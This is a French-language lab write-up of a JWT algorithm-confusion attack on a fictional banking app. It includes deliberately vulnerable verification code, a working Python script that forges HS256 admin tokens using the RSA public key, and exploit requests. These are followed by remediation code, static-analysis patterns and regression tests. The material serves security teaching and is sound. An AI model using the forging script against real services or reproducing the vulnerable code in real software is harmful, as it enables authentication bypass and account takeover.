# Write-up : Algorithm Confusion RS256 vers HS256

---

## Résumé exécutif

L'attaque par confusion d'algorithme exploite un serveur qui accepte plusieurs algorithmes de signature JWT et lit la valeur `alg` directement depuis l'en-tête du token. En passant d'un algorithme asymétrique (RS256) à un algorithme symétrique (HS256), et en utilisant la clé publique RSA comme secret HMAC, un attaquant peut signer lui-même des tokens que le serveur validera comme légitimes. Aucune clé privée n'est nécessaire : la clé publique, exposée par conception, suffit.

- **Sévérité** : Critique (CVSS 9.8)
- **CWE** : CWE-347 (Improper Verification of Cryptographic Signature) / CWE-757 (Selection of Less-Secure Algorithm During Negotiation)
- **Catégorie OWASP** : A02:2021 — Cryptographic Failures
- **Impact** : Contournement complet de l'authentification, escalade de privilèges
- **Exploitabilité** : Facile si la clé publique est accessible (JWKS, endpoint public, certificat)

---

## 1. Rappel sur les algorithmes JWT

Le standard JWA (RFC 7518) définit deux grandes familles d'algorithmes de signature :

| Famille | Exemple | Type | Clé utilisée |
|---------|---------|------|--------------|
| HMAC | HS256, HS384, HS512 | Symétrique | Secret partagé (même clé pour signer et vérifier) |
| RSA | RS256, RS384, RS512 | Asymétrique | Clé privée pour signer, clé publique pour vérifier |
| ECDSA | ES256, ES384, ES512 | Asymétrique | Clé privée pour signer, clé publique pour vérifier |
| Aucun | none | Aucun | Aucune signature |

### Différence critique entre HMAC et RSA

**HS256** : une seule clé secrète sert à signer et à vérifier. Quiconque possède le secret peut forger des tokens.

**RS256** : deux clés distinctes. La clé privée reste sur le serveur pour signer. La clé publique est distribuée librement pour que n'importe qui puisse vérifier les signatures.

La sécurité de RS256 repose sur le fait que la clé publique ne permet pas de signer. Un attaquant qui intercepte la clé publique ne peut pas produire de signature valide.

### Le point de bascule

Le protocole JWT prévoit que le champ `alg` de l'en-tête indique l'algorithme utilisé. La RFC précise que le serveur doit valider ce champ et ne doit pas faire confiance à une valeur arbitraire fournie par le client.

Lorsqu'un serveur vérifie une signature, il a besoin de savoir quel algorithme utiliser. S'il lit cette information dans le token lui-même, il délègue une décision de sécurité à l'attaquant.

---

## 2. Principe de la vulnérabilité

### 2.1 Mécanisme

Le serveur reçoit un token dont l'en-tête indique `alg: HS256`. Il doit choisir la clé à utiliser pour vérifier la signature. Une implémentation naïve procède ainsi :

1. Lire `alg` dans l'en-tête
2. Si `alg == "RS256"`, vérifier avec la clé publique RSA
3. Si `alg == "HS256"`, vérifier avec un secret HMAC

Le développeur suppose que la clé à utiliser est la clé publique dans les deux cas, car c'est la seule clé dont dispose le serveur pour vérifier. Il la passe donc comme secret HMAC.

Or, HS256 attend un **secret** qui doit rester confidentiel. La clé publique n'est pas un secret : elle est distribuée, publiée, accessible. En utilisant cette clé publique comme secret HMAC, le serveur permet à quiconque la possède (donc tout le monde) de signer des tokens valides.

### 2.2 Le code fautif

```python
def verifier_token(token, public_key):
    header = decode_header(token)
    alg = header.get("alg")

    if alg == "RS256":
        public_key.verify(signature, data, padding, hashes.SHA256())
    elif alg == "HS256":
        # Faille : la clé publique est utilisée comme secret HMAC
        expected = hmac.new(public_key_bytes, data, hashlib.sha256).digest()
        if not hmac.compare_digest(expected, signature):
            raise ValueError("Signature invalide")
```

La ligne problématique est celle du `hmac.new(public_key_bytes, ...)`. La clé publique, qui n'est pas secrète, devient la clé de vérification HMAC.

### 2.3 Pourquoi cela fonctionne

Supposons que le serveur utilise une clé publique RSA au format PEM. Ce format est une chaîne de caractères standardisée, facilement reproductible. Un attaquant peut :

1. Récupérer la clé publique (endpoint JWKS, certificat TLS, fichier public)
2. Construire un header JWT avec `alg: HS256`
3. Construire un payload JWT avec les claims de son choix
4. Calculer la signature HMAC en utilisant **la clé publique** comme secret
5. Envoyer le token

Le serveur lit `alg: HS256`, utilise la clé publique comme secret HMAC, recalcule la signature et la compare. Comme l'attaquant a utilisé exactement les mêmes octets, les signatures correspondent. Le token est accepté.

---

## 3. Contexte historique

Cette vulnérabilité a touché plusieurs bibliothèques JWT majeures et continue d'apparaître dans des implémentations personnalisées.

| CVE | Bibliothèque | Langage | Année |
|-----|--------------|---------|-------|
| CVE-2015-9235 | jsonwebtoken | Node.js | 2015 |
| CVE-2016-5431 | php-jwt | PHP | 2016 |
| CVE-2016-10555 | jwt-simple | Node.js | 2016 |
| CVE-2018-0114 | jose4j | Java | 2018 |
| CVE-2018-1000531 | jwt | Ruby | 2018 |

La faille est référencée dans le Top 10 OWASP API Security sous API2:2023 — Broken Authentication, et dans le Top 10 Web sous A02:2021 — Cryptographic Failures.

---

## 4. Environnement du laboratoire

### 4.1 Application cible

Nova Bank est une application bancaire en ligne. L'authentification repose sur des JWT signés avec RS256. La clé publique est exposée sur un endpoint dédié, ce qui est standard pour permettre à des services tiers de vérifier les tokens.

### 4.2 Comptes de test

```
Client standard : alice / alice123 (role: user)
Administrateur  : admin / admin123 (role: admin)
```

### 4.3 Endpoints

```
GET  /                     - Page de connexion
GET  /dashboard            - Espace client
POST /api/login            - Authentification (retourne un JWT RS256)
GET  /api/me               - Profil courant
GET  /api/public-key       - Clé publique RSA au format PEM
GET  /api/admin/vulnerable - Coffre-fort interne (vulnérable)
GET  /api/admin/secure     - Coffre-fort interne (sécurisé)
```

---

## 5. Analyse du code vulnérable

### 5.1 Endpoint admin vulnérable

```python
@app.route("/api/admin/vulnerable")
def admin_vulnerable():
    token = get_token()

    parts = token.split(".")
    h_b64, p_b64, s_b64 = parts

    header = json.loads(b64d(h_b64))
    payload = json.loads(b64d(p_b64))
    alg = header.get("alg")

    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = b64d(s_b64)

    if alg == "HS256":
        # Faille : clé publique utilisée comme secret HMAC
        expected = hmac.new(PUBLIC_KEY_PEM, signing_input, hashlib.sha256).digest()
        if not hmac.compare_digest(expected, sig):
            raise ValueError("Signature invalide")
    elif alg == "RS256":
        PUBLIC_KEY.verify(sig, signing_input, padding.PKCS1v15(), hashes.SHA256())
    else:
        raise ValueError("Algorithme non autorisé")

    if payload.get("role") != "admin":
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"flag": "SPECTRA{...}", ...})
```

### 5.2 Anti-patterns identifiés

| Anti-pattern | Localisation | Conséquence |
|--------------|--------------|-------------|
| Lecture de `alg` depuis le header | `alg = header.get("alg")` | L'attaquant choisit l'algorithme |
| Branche conditionnelle sur `alg` | `if alg == "HS256"` | Élargit la surface d'attaque |
| Utilisation de la clé publique comme secret HMAC | `hmac.new(PUBLIC_KEY_PEM, ...)` | Confusion entre clé et secret |
| Absence de whitelist | Pas de constante serveur | N'importe quel algorithme est accepté |

---

## 6. Exploitation pas à pas

### 6.1 Reconnaissance

Connexion avec le compte utilisateur standard.

```
POST /api/login
Content-Type: application/json

{"username":"alice","password":"alice123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5OTk5OTk5LCJleHAiOjE3MjAwMDM1OTl9.xxxxx
```

Décodage de l'en-tête :

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

Décodage du payload :

```json
{
  "sub": "1",
  "username": "alice",
  "email": "alice@novabank.io",
  "role": "user",
  "iat": 1719999999,
  "exp": 1720003599
}
```

### 6.2 Récupération de la clé publique

```
GET /api/public-key
```

Réponse :

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAspHcTLduaIh4KBmygPBG
...
-----END PUBLIC KEY-----
```

Cette clé est publique par nature. Sa divulgation n'est pas une faille. Ce qui est une faille, c'est son utilisation comme secret HMAC.

### 6.3 Construction du token forgé

L'attaquant prépare un header indiquant HS256, un payload avec un rôle administrateur, et signe avec la clé publique comme secret.

```python
import base64
import json
import hmac
import hashlib
import time

def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# Clé publique récupérée depuis /api/public-key
PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAspHcTLduaIh4KBmygPBG
...
-----END PUBLIC KEY-----"""

# En-tête modifié : HS256 au lieu de RS256
header = {"alg": "HS256", "typ": "JWT"}

# Payload avec rôle administrateur
payload = {
    "sub": "1",
    "username": "alice",
    "email": "alice@novabank.io",
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
}

h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{h}.{p}".encode()

# Signature HMAC utilisant la clé publique comme secret
signature = hmac.new(PUBLIC_KEY_PEM, signing_input, hashlib.sha256).digest()
s = b64e(signature)

forged_token = f"{h}.{p}.{s}"
print(forged_token)
```

### 6.4 Envoi du token forgé

```
GET /api/admin/vulnerable
Cookie: token=<token forgé avec HS256>
```

Le serveur :

1. Lit `alg: HS256` dans l'en-tête
2. Utilise la clé publique comme secret HMAC
3. Recalcule la signature
4. Compare avec celle fournie
5. Les signatures correspondent

Réponse :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{rs256_turn3d_1nt0_hm4c}",
    ...
  }
}
```

L'attaquant a obtenu un accès administrateur en signant avec une clé publique.

### 6.5 Vérification sur l'endpoint sécurisé

Le même token envoyé sur l'endpoint corrigé :

```
GET /api/admin/secure
Cookie: token=<même token forgé>
```

Réponse :

```
HTTP/1.1 401 Unauthorized
{"ok": false, "error": "Bloqué: algorithm not allowed"}
```

Le serveur refuse tout algorithme différent de RS256.

---

## 7. Variantes d'exploitation

### 7.1 Utilisation de la clé au format DER

Certaines implémentations utilisent la clé publique au format DER (binaire) plutôt que PEM. La chaîne binaire exacte doit alors être reproduite. L'attaquant l'obtient en convertissant le PEM reçu.

### 7.2 Utilisation d'une clé publique au format JWK

Si la clé publique est exposée en JWKS, l'attaquant peut la convertir en PEM puis l'utiliser comme secret. La conversion est déterministe.

### 7.3 Récupération via certificat TLS

Sur HTTPS, la clé publique est incluse dans le certificat du serveur. Un attaquant peut l'extraire avec `openssl s_client` ou depuis le navigateur.

```bash
openssl s_client -connect api.novabank.io:443 -showcerts </dev/null \
  | openssl x509 -pubkey -noout
```

### 7.4 Récupération via JWKS

Si le serveur expose un endpoint `/.well-known/jwks.json`, la clé est directement au format JWK. Sa conversion en PEM est immédiate.

### 7.5 Utilisation d'ES256 au lieu de HS256

Sur un serveur acceptant ES256 et HS256, la même confusion s'applique avec la clé publique ECDSA.

### 7.6 Combinaison avec d'autres failles

L'algorithm confusion peut se combiner avec :

- `kid` injection pour forcer la clé utilisée
- `jku` injection pour fournir une clé attaquante
- `alg:none` si l'algorithme `none` est également accepté

---

## 8. Conditions d'exploitation

| Condition | Description |
|-----------|-------------|
| Serveur signant en RS256 | Utilisation d'un algorithme asymétrique |
| Acceptation de HS256 | Le serveur ne filtre pas strictement l'algorithme |
| Lecture de `alg` dans le header | Décision déléguée au client |
| Clé publique accessible | Endpoint public, JWKS ou certificat TLS |
| Utilisation de la clé publique en HMAC | Confusion clé/secret |

Ces conditions sont fréquentes dans les applications qui adoptent RS256 puis ajoutent un support multi-algorithme sans audit.

---

## 9. Remédiation

### 9.1 Principe directeur

Le serveur ne doit jamais lire l'algorithme depuis le token. Il doit imposer l'algorithme attendu comme constante serveur.

### 9.2 Code corrigé

```python
EXPECTED_ALG = "RS256"

def jwt_verify(token, public_key):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Format invalide")

    h_b64, p_b64, s_b64 = parts
    header = json.loads(b64d(h_b64))
    payload = json.loads(b64d(p_b64))

    # Contrôle strict de l'algorithme
    if header.get("alg") != EXPECTED_ALG:
        raise ValueError("Algorithme non autorisé")

    # Vérification RSA uniquement
    try:
        public_key.verify(
            b64d(s_b64),
            f"{h_b64}.{p_b64}".encode(),
            padding.PKCS1v15(),
            hashes.SHA256()
        )
    except Exception:
        raise ValueError("Signature invalide")

    if "exp" in payload and int(payload["exp"]) < int(time.time()):
        raise ValueError("Token expiré")

    return payload
```

Points clés :

- `EXPECTED_ALG` est une constante serveur
- Toute valeur différente est rejetée
- Une seule branche de vérification existe
- Aucune utilisation de HMAC dans un serveur RS256

### 9.3 Utilisation d'une bibliothèque éprouvée

Les bibliothèques modernes exposent une API qui impose la whitelist :

```python
import jwt

payload = jwt.decode(
    token,
    PUBLIC_KEY,
    algorithms=["RS256"]  # Whitelist stricte
)
```

Le paramètre `algorithms` est obligatoire dans PyJWT 2.x. Toute tentative de décodage sans ce paramètre lève une exception.

### 9.4 Mesures complémentaires

| Mesure | Description |
|--------|-------------|
| Whitelist stricte | Un seul algorithme accepté |
| Séparation des types de clés | Ne jamais mélanger clés RSA et secrets HMAC |
| Validation de l'usage | Vérifier `use: sig` dans le JWK |
| Rotation des clés | Renouveler régulièrement les paires RSA |
| Journalisation | Détecter les tentatives avec `alg` non standard |
| Tests automatisés | Un token HS256 doit être rejeté systématiquement |
| Documentation | Indiquer l'algorithme attendu dans la doc API |

### 9.5 Détection par analyse statique

Patterns à rechercher :

```
header.get("alg") == "HS256"
hmac.new(public_key
hmac.new(PUBLIC_KEY
algorithms=[header["alg"]]
algorithms=None
verify=False
```

Toute mention de HMAC dans un contexte RSA, ou toute lecture du header pour choisir la clé, doit être auditée.

---

## 10. Tests de non-régression

```python
def test_token_hs256_rejete(client):
    token = forger_hs256_avec_cle_publique()
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_token_rs256_valide_accepte(client):
    token = jwt.encode({"role": "admin"}, PRIVATE_KEY, algorithm="RS256")
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 200

def test_alg_modifie_rejete(client):
    token = forger_token_avec_header({"alg": "none"})
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401

def test_alg_hs384_rejete(client):
    token = forger_hs384_avec_cle_publique()
    r = client.get("/api/admin/secure",
                   headers={"Authorization": f"Bearer {token}"})
    assert r.status_code == 401
```

---

## 11. Impact métier

Pour une application bancaire, l'exploitation de cette vulnérabilité permet :

- Accès aux comptes de tous les clients
- Consultation des données financières sensibles
- Initiation de virements au nom de tiers
- Accès aux rapports internes et données réglementaires
- Usurpation d'identité auprès des services partenaires
- Compromission de la chaîne d'authentification

L'impact réglementaire est significatif : violation RGPD, non-conformité DORA pour le secteur financier, obligation de notification à l'autorité de contrôle.

---

## 12. Conclusion

L'attaque par confusion d'algorithme repose sur une erreur d'architecture : le serveur délègue au client le choix de la méthode de vérification. Ce choix devrait toujours être une décision serveur.

Le correctif est simple : imposer un algorithme unique via une whitelist côté serveur. Un serveur qui signe en RS256 doit refuser tout token qui n'est pas signé en RS256, indépendamment de ce que prétend son en-tête.

Les bibliothèques modernes imposent cette pratique. Les implémentations maison et les wrappers autour de bibliothèques doivent être audités pour s'assurer que le champ `alg` n'est jamais utilisé pour piloter la logique de vérification.

---

## Références

- RFC 7515 — JSON Web Signature (JWS)
- RFC 7517 — JSON Web Key (JWK)
- RFC 7518 — JSON Web Algorithms (JWA)
- CVE-2015-9235, CVE-2016-5431, CVE-2016-10555, CVE-2018-0114
- OWASP Top 10 — A02:2021 Cryptographic Failures
- OWASP API Security Top 10 — API2:2023 Broken Authentication
- OWASP JSON Web Token Cheat Sheet
- CWE-347 : Improper Verification of Cryptographic Signature
- CWE-757 : Selection of Less-Secure Algorithm During Negotiation
- PortSwigger Web Security Academy — Algorithm confusion attacks
